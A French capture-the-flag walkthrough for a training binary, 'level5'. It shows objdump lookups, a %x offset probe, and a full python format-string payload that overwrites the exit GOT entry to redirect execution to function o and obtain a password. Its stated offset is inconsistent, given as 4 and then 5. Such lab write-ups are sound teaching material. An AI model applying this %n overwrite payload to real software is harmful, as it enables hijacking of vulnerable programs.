En analysant le code, on constate qu'afin de pouvoir lire notre prochain mot de passe, il faut pouvoir executer la fonction o.

On va d'abbord chercher plus de details sur o:

```shell
objdump -t ./level5 | grep o
```

--> On obtient la ligne `080484a4 g     F .text	0000001e              o`
o est donc bien une fonction (F), nous allons donc chercher a jump sur son adresse: 080484a4 (ou \xa4\x84\x04\x08 en Little Endian). --> En decimal: 134513828

```shell
objdump -R ./level5 | grep exit
```
--> On constate qu'il y a deux call de exit (un dans la fonction o et un dans la fonction n). On testera la commande avec les deux, mais la bonne adresse est la deuxieme: 08049838, soit \x38\x98\x04\x08


--> On va dorenavant calculer l'offset (comme precedemment)

```shell
./level5
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x
```

--> On constate que la quatrieme valeur est "41414141", l'offset est donc de 4.

## Nous avons donc

1. L'adresse de o en decimal: 134513828 (-4 car adresse exit) = 134513824
2. L'adresse de exit: \x38\x98\x04\x08
3. Ou ecrire: a l'offset 5 (%5$n)

On va donc attribuer la valeur de o a la place de l'adresse exit:

```shell
(python -c 'print("\x38\x98\x04\x08%134513824x%4$n")'; cat) | ./level5
```

--> Nous avons notre mot de passe pour le level 6 !
